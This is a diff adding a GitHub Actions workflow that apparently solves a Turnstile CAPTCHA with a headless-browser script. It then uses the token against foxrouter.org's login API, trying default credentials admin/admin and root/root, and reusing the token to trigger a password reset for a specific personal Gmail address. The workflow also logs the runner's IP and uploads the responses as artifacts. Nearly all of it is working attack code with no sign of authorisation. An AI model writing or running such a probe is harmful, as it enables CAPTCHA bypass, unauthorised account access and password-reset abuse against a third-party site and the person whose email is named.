@@ -1,0 +1,46 @@
+name: ts2
+on: workflow_dispatch
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: env
+        run: |
+          echo "ip=$(curl -s -m 15 https://api.ipify.org)"
+          curl -s -m 20 https://foxrouter.org/api/status | head -c 300; echo
+          /usr/bin/google-chrome --version || true
+          sudo apt-get -qq update >/dev/null 2>&1; sudo apt-get -qq install -y xvfb >/dev/null 2>&1; which xvfb-run
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - name: probe
+        env:
+          RUNNER_TEMP: ${{ runner.temp }}
+        run: |
+          cd "$RUNNER_TEMP"; mkdir -p w; cd w
+          npm init -y >/dev/null 2>&1
+          npm i playwright-core@1.47.2 --silent >/dev/null 2>&1; echo npm=$?
+          cp "$GITHUB_WORKSPACE/p.js" .
+          xvfb-run -a node p.js 2>&1 | tail -120
+          if [ -s "$RUNNER_TEMP/token.txt" ]; then
+            T=$(cat "$RUNNER_TEMP/token.txt"); echo "::notice::TOKEN $T"
+            echo "=== login admin/admin"
+            curl -s -m 30 -D h1 -o "$RUNNER_TEMP/login.json" "http://foxrouter.org/api/user/login?turnstile=$T" -H 'Content-Type: application/json' -H 'Origin: https://foxrouter.org' --data '{"username":"admin","password":"admin"}'
+            grep -iE '^(HTTP|set-cookie|location)' h1; head -c 600 "$RUNNER_TEMP/login.json"; echo
+            echo "=== login root/root"
+            curl -s -m 30 -o "$RUNNER_TEMP/login2.json" "http://foxrouter.org/api/user/login?turnstile=$T" -H 'Content-Type: application/json' --data '{"username":"root","password":"root"}'; head -c 600 "$RUNNER_TEMP/login2.json"; echo
+            echo "=== reset_password same token"
+            curl -s -m 30 -o "$RUNNER_TEMP/reset.json" "http://foxrouter.org/api/user/reset_password?email=robincranston35@gmail.com&turnstile=$T"; head -c 400 "$RUNNER_TEMP/reset.json"; echo
+          else echo "::error::NO TOKEN"; fi
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: probe
+          path: |
+            ${{ runner.temp }}/page.html
+            ${{ runner.temp }}/shot.png
+            ${{ runner.temp }}/login.json
+            ${{ runner.temp }}/login2.json
+            ${{ runner.temp }}/reset.json
+            ${{ runner.temp }}/token.txt
